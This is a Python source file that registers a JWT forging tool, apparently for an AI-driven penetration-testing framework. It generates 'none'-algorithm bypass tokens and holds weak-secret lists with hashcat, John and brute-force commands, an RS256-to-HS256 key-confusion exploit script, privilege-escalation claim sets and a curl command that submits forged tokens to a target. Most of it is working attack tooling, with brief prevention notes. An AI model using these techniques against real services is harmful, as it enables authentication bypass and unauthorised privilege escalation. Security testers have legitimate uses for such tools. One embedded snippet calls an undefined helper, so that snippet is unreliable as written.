"""JWT token forging and manipulation tool."""

import base64
import json
import re
from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)

ToolAction = Literal[
    "forge_none_alg",
    "forge_weak_secret",
    "forge_key_confusion",
    "modify_claims",
    "generate_token",
]


def _base64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')


def _base64url_decode(data: str) -> bytes:
    """Base64url decode with padding restoration."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)


def _parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Parse JWT into header, payload, and signature."""
    parts = token.split('.')
    if len(parts) != 3:
        return None

    try:
        header = json.loads(_base64url_decode(parts[0]))
        payload = json.loads(_base64url_decode(parts[1]))
        signature = parts[2]
        return header, payload, signature
    except Exception:
        return None


@register_tool(sandbox_execution=True)
def jwt_forge(
    action: ToolAction,
    token: str | None = None,
    claims: dict | None = None,
    secret: str | None = None,
    public_key: str | None = None,
    algorithm: str | None = None,
    **kwargs: Any,
) -> dict[str, Any] | str:
    """JWT token forging and manipulation tool.

    Args:
        action: The action to perform
        token: Original JWT token to manipulate
        claims: Claims to modify or add to the token
        secret: Secret key for signing (weak secret testing)
        public_key: Public key (for key confusion attacks)
        algorithm: Algorithm to use for forging

    Returns:
        Results dict or error message
    """
    VALID_PARAMS = {
        "action", "token", "claims", "secret", "public_key", "algorithm",
    }
    VALID_ACTIONS = [
        "forge_none_alg",
        "forge_weak_secret",
        "forge_key_confusion",
        "modify_claims",
        "generate_token",
    ]

    if unknown_error := validate_unknown_params(kwargs, VALID_PARAMS, "jwt_forge"):
        return unknown_error

    if action_error := validate_action_param(action, VALID_ACTIONS, "jwt_forge"):
        return action_error

    if action == "forge_none_alg":
        if param_error := validate_required_param(token, "token", action, "jwt_forge"):
            return param_error

        parsed = _parse_jwt(token)
        if not parsed:
            return {"error": "Invalid JWT format"}

        header, payload, _ = parsed

        # Create none algorithm header
        none_header = {"typ": "JWT", "alg": "none"}

        # Encode without signature
        header_b64 = _base64url_encode(json.dumps(none_header).encode())
        payload_b64 = _base64url_encode(json.dumps(payload).encode())

        # Various none algorithm bypass attempts
        forged_tokens = {
            "none": f"{header_b64}.{payload_b64}.",
            "None": f"{_base64url_encode(json.dumps({'typ': 'JWT', 'alg': 'None'}).encode())}.{payload_b64}.",
            "NONE": f"{_base64url_encode(json.dumps({'typ': 'JWT', 'alg': 'NONE'}).encode())}.{payload_b64}.",
            "nOnE": f"{_base64url_encode(json.dumps({'typ': 'JWT', 'alg': 'nOnE'}).encode())}.{payload_b64}.",
            "empty_sig": f"{header_b64}.{payload_b64}.",
        }

        return {
            "action": "forge_none_alg",
            "original_token": token,
            "original_algorithm": header.get("alg"),
            "original_claims": payload,
            "forged_tokens": forged_tokens,
            "description": "JWT 'none' algorithm attack - removes signature verification",
            "vulnerability": "CVE-2015-2951 - JWT libraries accepting 'none' algorithm",
            "testing_methodology": [
                "1. Replace alg header with 'none' (case variations)",
                "2. Remove or empty the signature part",
                "3. Submit to application and check if accepted",
                "4. If accepted, application is vulnerable",
            ],
            "curl_test": f'''
# Test none algorithm bypass
curl -H "Authorization: Bearer {forged_tokens['none']}" https://target.com/api/protected
''',
            "prevention": [
                "Explicitly reject 'none' algorithm in JWT library config",
                "Whitelist allowed algorithms",
                "Use jwt.decode() with algorithms parameter",
            ],
        }

    elif action == "forge_weak_secret":
        if param_error := validate_required_param(token, "token", action, "jwt_forge"):
            return param_error

        parsed = _parse_jwt(token)
        if not parsed:
            return {"error": "Invalid JWT format"}

        header, payload, signature = parsed

        # Common weak secrets to test
        weak_secrets = [
            "secret", "password", "123456", "key", "private",
            "jwt_secret", "changeme", "admin", "test", "development",
            "", "null", "undefined", "JWT_SECRET", "secret123",
        ]

        return {
            "action": "forge_weak_secret",
            "original_token": token,
            "original_algorithm": header.get("alg"),
            "claims": payload,
            "weak_secrets_to_try": weak_secrets,
            "description": "Test common weak secrets to forge valid tokens",
            "hashcat_command": f'''
# Extract hash for cracking
# Format: $JWT$alg$header.payload$signature

# Crack JWT with hashcat (mode 16500)
hashcat -m 16500 jwt_hash.txt wordlist.txt

# Or use jwt_tool
python3 jwt_tool.py {token} -C -d wordlist.txt
''',
            "john_command": f'''
# Convert JWT to John format
echo "{token}" > jwt.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
''',
            "python_bruteforce": f'''
import jwt
import itertools
import string

token = "{token}"
secrets = {weak_secrets}

for secret in secrets:
    try:
        decoded = jwt.decode(token, secret, algorithms=["HS256", "HS384", "HS512"])
        print(f"[+] FOUND SECRET: {{secret}}")
        print(f"    Payload: {{decoded}}")
        break
    except jwt.InvalidSignatureError:
        continue
    except Exception as e:
        continue
''',
            "jwt_tool_command": f"python3 jwt_tool.py {token} -C -d rockyou.txt",
            "tips": [
                "Try environment variable names as secrets",
                "Try company/app name variations",
                "Check for default secrets in documentation",
                "Weak HMAC secrets are common in dev/test environments",
            ],
        }

    elif action == "forge_key_confusion":
        if param_error := validate_required_param(token, "token", action, "jwt_forge"):
            return param_error

        parsed = _parse_jwt(token)
        if not parsed:
            return {"error": "Invalid JWT format"}

        header, payload, _ = parsed

        return {
            "action": "forge_key_confusion",
            "original_token": token,
            "original_algorithm": header.get("alg"),
            "claims": payload,
            "description": "Algorithm confusion attack - RS256 to HS256",
            "vulnerability": "CVE-2016-5431 - JWT key confusion vulnerability",
            "attack_explanation": [
                "1. Application uses RS256 (asymmetric - public/private key)",
                "2. Attacker changes alg to HS256 (symmetric - shared secret)",
                "3. Attacker signs token with the PUBLIC key as HMAC secret",
                "4. Server verifies with public key (now used as HMAC secret)",
                "5. Signature validates, token accepted!",
            ],
            "requirements": [
                "Need to obtain the public key (often exposed)",
                "Server must not validate algorithm before verification",
                "Server uses same verify function for both algorithms",
            ],
            "public_key_locations": [
                "/.well-known/jwks.json",
                "/oauth/jwks",
                "/api/keys",
                "x5c header in JWT itself",
                "Application source code/config",
            ],
            "python_exploit": '''
import jwt
import json

# Original RS256 token
original_token = "<RS256_TOKEN>"

# Public key (obtained from target)
public_key = """-----BEGIN PUBLIC KEY-----
<PUBLIC KEY HERE>
-----END PUBLIC KEY-----"""

# Decode without verification to get claims
header, payload, _ = original_token.split('.')

# Modify algorithm to HS256
new_header = {"typ": "JWT", "alg": "HS256"}

# Re-encode and sign with public key as secret
forged = jwt.encode(
    json.loads(base64url_decode(payload)),
    public_key,
    algorithm="HS256"
)

print(f"Forged token: {forged}")
''',
            "jwt_tool_command": f"python3 jwt_tool.py {token} -X k -pk public.pem",
            "prevention": [
                "Explicitly specify algorithm in jwt.decode()",
                "Never accept algorithm from token header alone",
                "Use separate keys for different algorithms",
            ],
        }

    elif action == "modify_claims":
        if param_error := validate_required_param(token, "token", action, "jwt_forge"):
            return param_error
        if param_error := validate_required_param(claims, "claims", action, "jwt_forge"):
            return param_error

        parsed = _parse_jwt(token)
        if not parsed:
            return {"error": "Invalid JWT format"}

        header, payload, signature = parsed

        # Merge new claims
        modified_payload = {**payload, **claims}

        # Encode modified payload
        header_b64 = _base64url_encode(json.dumps(header).encode())
        payload_b64 = _base64url_encode(json.dumps(modified_payload).encode())

        return {
            "action": "modify_claims",
            "original_claims": payload,
            "modified_claims": modified_payload,
            "changes_made": claims,
            "unsigned_token": f"{header_b64}.{payload_b64}.<NEEDS_SIGNATURE>",
            "description": "Modified JWT claims - requires valid signature to exploit",
            "common_privilege_escalation_claims": {
                "admin": True,
                "role": "admin",
                "is_admin": True,
                "groups": ["admin", "superuser"],
                "scope": "admin read write",
                "permissions": ["*"],
                "user_id": 1,
                "sub": "admin",
            },
            "signing_options": [
                "Use none algorithm attack (forge_none_alg)",
                "Crack weak secret (forge_weak_secret)",
                "Key confusion attack (forge_key_confusion)",
                "If you have the secret, sign normally",
            ],
            "python_resign": f'''
import jwt

modified_payload = {json.dumps(modified_payload, indent=2)}

# If you know the secret:
secret = "known_secret"
forged = jwt.encode(modified_payload, secret, algorithm="{header.get('alg', 'HS256')}")
print(forged)
''',
            "testing_tips": [
                "Try changing user_id, sub, or email claims",
                "Add admin/role claims if not present",
                "Modify exp to extend token lifetime",
                "Change aud/iss for different tenant access",
            ],
        }

    elif action == "generate_token":
        token_claims = claims or {
            "sub": "admin",
            "name": "Admin User",
            "admin": True,
            "iat": 1700000000,
            "exp": 1800000000,
        }
        token_alg = algorithm or "HS256"
        token_secret = secret or "secret"

        # Create header
        header = {"typ": "JWT", "alg": token_alg}

        # Encode
        header_b64 = _base64url_encode(json.dumps(header).encode())
        payload_b64 = _base64url_encode(json.dumps(token_claims).encode())

        # For none algorithm, no signature
        if token_alg.lower() == "none":
            generated_token = f"{header_b64}.{payload_b64}."
        else:
            # Show that signature would be computed
            generated_token = f"{header_b64}.{payload_b64}.<HMAC_SIGNATURE>"

        return {
            "action": "generate_token",
            "algorithm": token_alg,
            "claims": token_claims,
            "header": header,
            "token_structure": {
                "header_b64": header_b64,
                "payload_b64": payload_b64,
            },
            "generated_token": generated_token,
            "description": "Generate a JWT with specified claims",
            "python_generation": f'''
import jwt
from datetime import datetime, timedelta

claims = {json.dumps(token_claims, indent=2)}

# Generate signed token
secret = "{token_secret}"
token = jwt.encode(claims, secret, algorithm="{token_alg}")
print(token)

# With expiration
claims["exp"] = datetime.utcnow() + timedelta(hours=1)
claims["iat"] = datetime.utcnow()
token = jwt.encode(claims, secret, algorithm="{token_alg}")
''',
            "common_claims": {
                "sub": "Subject (user identifier)",
                "iss": "Issuer",
                "aud": "Audience",
                "exp": "Expiration time (Unix timestamp)",
                "iat": "Issued at (Unix timestamp)",
                "nbf": "Not before (Unix timestamp)",
                "jti": "JWT ID (unique identifier)",
            },
        }

    return generate_usage_hint("jwt_forge", VALID_ACTIONS)
